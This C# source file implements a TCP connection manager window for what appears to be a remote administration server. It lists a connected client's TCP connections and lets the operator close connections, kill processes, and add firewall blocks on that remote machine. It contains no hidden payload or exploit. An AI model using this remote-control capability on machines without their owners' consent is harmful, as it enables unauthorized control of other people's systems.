using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public class TcpEntryVM : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler? PropertyChanged;
    private void N([CallerMemberName] string? p = null) => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(p));

    private int    _pid;
    private string _processName = "";
    private string _exePath     = "";
    private string _localAddr   = "";
    private string _remoteAddr  = "";
    private string _state       = "";
    private BitmapSource? _icon;

    public int    Pid         { get => _pid;         set { if (_pid != value)         { _pid = value;         N(); } } }
    public string ProcessName { get => _processName; set { if (_processName != value) { _processName = value; N(); } } }
    public string ExePath     { get => _exePath;     set { if (_exePath != value)     { _exePath = value;     N(); } } }
    public string LocalAddr   { get => _localAddr;   set { if (_localAddr != value)   { _localAddr = value;   N(); } } }
    public string RemoteAddr  { get => _remoteAddr;  set { if (_remoteAddr != value)  { _remoteAddr = value;  N(); } } }
    public string State       { get => _state;       set { if (_state != value)       { _state = value;       N(); } } }
    public BitmapSource? IconImage { get => _icon; set { if (_icon != value) { _icon = value; N(); } } }
}

public partial class TcpManagerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<TcpEntryVM> _entries = [];
    private bool _disconnected = false;

    public TcpManagerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridTcp);
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text  = clientLabel;
        GridTcp.ItemsSource = _entries;

        _server.RegisterHandler(clientId, PacketType.TcpListResult,          OnTcpList);
        _server.RegisterHandler(clientId, PacketType.TcpFirewallRulesResult, OnFirewallResult);
        _server.ClientDisconnected += OnClientDisconnected;

        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.TcpListResult);
            _server.UnregisterHandler(clientId, PacketType.TcpFirewallRulesResult);
            _server.ClientDisconnected -= OnClientDisconnected;
            Lang.LanguageChanged -= ApplyLanguage;
        };
        Loaded += async (_, _) => { await Task.Delay(Random.Shared.Next(0, 250)); await Refresh(); };
    }

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_TCP_CONN");
        if (TxtBtnBlockIp   != null) TxtBtnBlockIp.Text   = Lang.Get("ACT_BLOCK_IP");
        if (TxtBtnBlockPort != null) TxtBtnBlockPort.Text = Lang.Get("ACT_BLOCK_PORT");
        if (MnuTcpClose      != null) MnuTcpClose.Header      = Lang.Get("ACT_CLOSE_CONN");
        if (MnuTcpKill       != null) MnuTcpKill.Header       = Lang.Get("ACT_KILL");
        if (MnuTcpCopyLocal  != null) MnuTcpCopyLocal.Header  = Lang.Get("ACT_COPY_LOCAL");
        if (MnuTcpCopyRemote != null) MnuTcpCopyRemote.Header = Lang.Get("ACT_COPY_REMOTE");
        if (ColTcpPid     != null) ColTcpPid.Header     = Lang.Get("PM_COL_PID");
        if (ColTcpProcess != null) ColTcpProcess.Header = Lang.Get("WIN_COL_PROCESS");
        if (ColTcpLocal   != null) ColTcpLocal.Header   = Lang.Get("TCP_COL_LOCAL");
        if (ColTcpRemote  != null) ColTcpRemote.Header  = Lang.Get("TCP_COL_REMOTE");
        if (ColTcpState   != null) ColTcpState.Header   = Lang.Get("WIN_COL_STATE");
    }

    private async Task Refresh()
    {
        if (_disconnected) return;
        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpGetList });
    }

    private void OnTcpList(Packet pkt)
    {
        try
        {
            var data = JsonConvert.DeserializeObject<TcpListResultData>(pkt.Data);
            if (data == null) return;

            _ = Task.Run(() =>
            {
                // Phase 1: incremental update of entries on UI thread
                Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
                {
                    var selectedKey = GetSelectedKey();
                    var byKey = _entries.ToDictionary(e => MakeKey(e));

                    var seenKeys = new HashSet<string>();
                    foreach (var e in data.Entries)
                    {
                        var key = MakeKey(e.LocalAddr, e.RemoteAddr, e.Pid);
                        seenKeys.Add(key);
                        if (byKey.TryGetValue(key, out var existing))
                        {
                            existing.ProcessName = e.ProcessName;
                            existing.ExePath     = e.ExePath;
                            existing.State       = e.State;
                        }
                        else
                        {
                            _entries.Add(new TcpEntryVM
                            {
                                Pid = e.Pid, ProcessName = e.ProcessName, ExePath = e.ExePath,
                                LocalAddr = e.LocalAddr, RemoteAddr = e.RemoteAddr, State = e.State
                            });
                        }
                    }
                    for (int i = _entries.Count - 1; i >= 0; i--)
                        if (!seenKeys.Contains(MakeKey(_entries[i])))
                            _entries.RemoveAt(i);

                    TxtCount.Text  = $"({_entries.Count})";
                    TxtStatus.Text = string.Format(Lang.Get("TCP_UPDATED"), _entries.Count, DateTime.Now.ToString("HH:mm:ss"));

                    if (selectedKey != null)
                    {
                        var restore = _entries.FirstOrDefault(e => MakeKey(e) == selectedKey);
                        if (restore != null) GridTcp.SelectedItem = restore;
                    }
                });

                // Phase 2: decode icons on UI (STA) thread — BitmapImage requires STA, not safe on threadpool
                var iconData = data.Entries
                    .Where(e => !string.IsNullOrEmpty(e.IconB64))
                    .Select(e => (Key: MakeKey(e.LocalAddr, e.RemoteAddr, e.Pid), e.IconB64))
                    .ToList();
                if (iconData.Count > 0)
                {
                    Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
                    {
                        var byKey = _entries.ToDictionary(e => MakeKey(e));
                        foreach (var (key, b64) in iconData)
                        {
                            if (!byKey.TryGetValue(key, out var vm)) continue;
                            var icon = DecodeIcon(b64);
                            if (icon != null) vm.IconImage = icon;
                        }
                    });
                }
            });
        }
        catch { }
    }

    private static string MakeKey(string local, string remote, int pid) => $"{local}|{remote}|{pid}";
    private static string MakeKey(TcpEntryVM vm) => $"{vm.LocalAddr}|{vm.RemoteAddr}|{vm.Pid}";
    private static string MakeKey(TcpEntry e)    => $"{e.LocalAddr}|{e.RemoteAddr}|{e.Pid}";
    private string? GetSelectedKey() => GridTcp.SelectedItem is TcpEntryVM vm ? MakeKey(vm) : null;

    private void OnFirewallResult(Packet pkt)
    {
        try
        {
            var data = JsonConvert.DeserializeObject<TcpFirewallRulesResultData>(pkt.Data);
            Dispatcher.BeginInvoke(() =>
            {
                if (data == null || data.Rules.Count == 0)
                    TxtStatus.Text = Lang.Get("TCP_FIREWALL_FAIL");
                else
                    TxtStatus.Text = string.Format(Lang.Get("TCP_FIREWALL_RULES"), data.Rules.Count, string.Join(", ", data.Rules.Select(r => r.RuleName)));
            });
        }
        catch { }
    }

    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(() =>
        {
            _disconnected = true;
            TxtStatus.Text    = Lang.Get("PM_DISCONNECTED");
            TxtStatus.Foreground = new SolidColorBrush(Color.FromRgb(0xF5, 0x9E, 0x0B));
            GridTcp.Opacity   = 0.55;
        });
    }

    private async void Refresh_Click(object s, RoutedEventArgs e) { try { await Refresh(); } catch { } }

    private async void CloseConn_Click(object s, RoutedEventArgs e)
    {
        try
        {
            var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().ToList();
            if (sel.Count == 0) return;
            string confirmMsg = sel.Count == 1
                ? string.Format(Lang.Get("TCP_CLOSE_CONFIRM_1"), sel[0].RemoteAddr, sel[0].ProcessName)
                : string.Format(Lang.Get("TCP_CLOSE_CONFIRM_N"), sel.Count);
            if (MessageBox.Show(confirmMsg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
            foreach (var row in sel)
            {
                var data = JsonConvert.SerializeObject(new TcpCloseData { LocalAddr = row.LocalAddr, RemoteAddr = row.RemoteAddr });
                await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpClose, Data = data });
            }
            ServerWindow.ReportGlobalActivity("Close TCP", sel.Count == 1 ? sel[0].RemoteAddr : $"{sel.Count} conns", "complete");
            ServerWindow.LogGlobal($"[TCP] Closed {(sel.Count == 1 ? $"TCP connection {sel[0].RemoteAddr} ({sel[0].ProcessName})" : $"{sel.Count} TCP connections")} on client {_clientId}.");
            await Task.Delay(300);
            await Refresh();
        }
        catch { }
    }

    private async void KillProc_Click(object s, RoutedEventArgs e)
    {
        try
        {
            if (_disconnected) return;
            var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().Where(r => r.Pid > 0).ToList();
            if (sel.Count == 0) return;
            string confirmMsg = sel.Count == 1
                ? string.Format(Lang.Get("PM_KILL_1"), sel[0].ProcessName, sel[0].Pid)
                : string.Format(Lang.Get("PM_KILL_N"), sel.Count);
            if (MessageBox.Show(confirmMsg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
            foreach (var row in sel)
                await _server.SendToClient(_clientId, new Packet
                {
                    Type = PacketType.ProcKill,
                    Data = JsonConvert.SerializeObject(new ProcKillData { Pid = row.Pid })
                });
            TxtStatus.Text = sel.Count == 1
                ? string.Format(Lang.Get("TCP_KILL_SENT"), sel[0].Pid, sel[0].ProcessName)
                : string.Format(Lang.Get("TCP_KILL_SENT_N"), sel.Count);
            ServerWindow.ReportGlobalActivity("Kill process", sel.Count == 1 ? sel[0].ProcessName : $"{sel.Count} processes", "complete");
            ServerWindow.LogGlobal($"[TCP] Killed process {(sel.Count == 1 ? $"'{sel[0].ProcessName}' (PID {sel[0].Pid})" : $"{sel.Count} processes")} via TCP manager on client {_clientId}.");
            await Task.Delay(600);
            await Refresh();
        }
        catch { }
    }

    private static BitmapSource? DecodeIcon(string b64)
    {
        if (string.IsNullOrEmpty(b64)) return null;
        try
        {
            var bytes = Convert.FromBase64String(b64);
            using var ms = new System.IO.MemoryStream(bytes);
            var bmp = new BitmapImage();
            bmp.BeginInit();
            bmp.CacheOption  = BitmapCacheOption.OnLoad;
            bmp.StreamSource = ms;
            bmp.EndInit();
            bmp.Freeze();
            return bmp;
        }
        catch { return null; }
    }

    private async void BlockIp_Click(object s, RoutedEventArgs e)
    {
        try
        {
            if (_disconnected) return;
            var selected = GridTcp.SelectedItem as TcpEntryVM;
            string? defIp = selected?.RemoteAddr?.Split(':').FirstOrDefault();
            var ip = SimpleInput("Block remote IP in firewall (inbound + outbound):", defIp ?? "");
            if (string.IsNullOrWhiteSpace(ip)) return;
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.TcpFirewallBlock,
                Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = 0, RemoteIp = ip, Direction = "both" })
            });
            TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_IP"), ip);
            ServerWindow.ReportGlobalActivity("Firewall block IP", ip, "complete");
            ServerWindow.LogGlobal($"[TCP] Blocked remote IP {ip} in firewall on client {_clientId}.");
        }
        catch { }
    }

    private async void BlockProcess_Click(object s, RoutedEventArgs e)
    {
        try
        {
            if (_disconnected) return;
            var selected = GridTcp.SelectedItem as TcpEntryVM;
            var name = SimpleInput("Block process (full path or name):", selected?.ProcessName ?? "");
            if (string.IsNullOrWhiteSpace(name)) return;
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.TcpFirewallBlock,
                Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = name, Port = 0, Direction = "both" })
            });
            TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_PROC"), name);
            ServerWindow.ReportGlobalActivity("Firewall block proc", name, "complete");
            ServerWindow.LogGlobal($"[TCP] Blocked process '{name}' in firewall on client {_clientId}.");
        }
        catch { }
    }

    private async void BlockPort_Click(object s, RoutedEventArgs e)
    {
        try
        {
            if (_disconnected) return;
            var selected = GridTcp.SelectedItem as TcpEntryVM;
            string? defPort = null;
            if (selected?.LocalAddr?.Contains(':') == true &&
                int.TryParse(selected.LocalAddr.Split(':').Last(), out _))
                defPort = selected.LocalAddr.Split(':').Last();

            var portStr = SimpleInput("Block port (TCP):", defPort ?? "");
            if (!int.TryParse(portStr, out int port) || port <= 0) return;
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.TcpFirewallBlock,
                Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = port, Direction = "both" })
            });
            TxtStatus.Text = string.Format(Lang.Get("TCP_BLOCK_PORT"), port);
            ServerWindow.ReportGlobalActivity("Firewall block port", port.ToString(), "complete");
            ServerWindow.LogGlobal($"[TCP] Blocked TCP port {port} in firewall on client {_clientId}.");
        }
        catch { }
    }

    private string? SimpleInput(string prompt, string? def = null)
    {
        var dlg = new AddKeywordDialog(this, def ?? "", prompt);
        return dlg.ShowDialog() == true ? dlg.Keyword : null;
    }

    private void GridTcp_CopyLocal_Click(object s, RoutedEventArgs e)
    {
        if (GridTcp.SelectedItem is TcpEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.LocalAddr); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.LocalAddr); } catch { }
    }

    private void GridTcp_CopyRemote_Click(object s, RoutedEventArgs e)
    {
        if (GridTcp.SelectedItem is TcpEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.RemoteAddr); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.RemoteAddr); } catch { }
    }

    private void GridTcp_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridTcp.SelectedItems.Count == 0) e.Handled = true;
    }
}
